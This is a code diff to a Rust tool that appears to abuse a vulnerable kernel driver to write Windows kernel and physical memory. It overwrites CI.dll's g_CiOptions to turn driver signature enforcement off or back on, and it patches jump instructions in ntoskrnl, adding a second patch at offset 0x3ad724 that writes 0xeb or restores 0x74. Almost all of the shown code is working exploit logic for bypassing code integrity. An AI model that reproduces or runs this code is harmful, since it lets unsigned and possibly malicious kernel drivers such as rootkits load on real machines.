@@ -23,6 +23,7 @@ fn main() -> Result<(), Box <dyn Error>> {
     let process = gb_driver.get_eprocess_by_pid(4).expect("Could not find pid");
     let cr3 = gb_driver.get_cr3_value_eprocess(process);
     let physical_address = gb_driver.virt_to_physical(cr3, ntoskrnl_base + 0x3ad6f1);
+    let physical_address2 = gb_driver.virt_to_physical(cr3, ntoskrnl_base + 0x3ad724);
 
     let ci_base = get_driver_base("CI.dll").expect("Could not find ci.dll");
 
@@ -36,12 +37,14 @@ fn main() -> Result<(), Box <dyn Error>> {
         gb_driver.write_bytes(ci_base + G_CIOPTIONS_OFFSET, &[0x16, 0, 0, 0u8]);
 
         gb_driver.write_phys_mem(physical_address, &[0x74, 0x6b]);
+        gb_driver.write_phys_mem(physical_address2, &[0x74]);
     }
     else {
         println!("Disabling signing");
         gb_driver.write_bytes(ci_base + G_CIOPTIONS_OFFSET, &[0x0, 0, 0, 0u8]);
 
         gb_driver.write_phys_mem(physical_address, &[0x90, 0x90]);
+        gb_driver.write_phys_mem(physical_address2, &[0xeb]);
     }
 
     println!("g_ci_options -> {:#x}", g_ci_options);
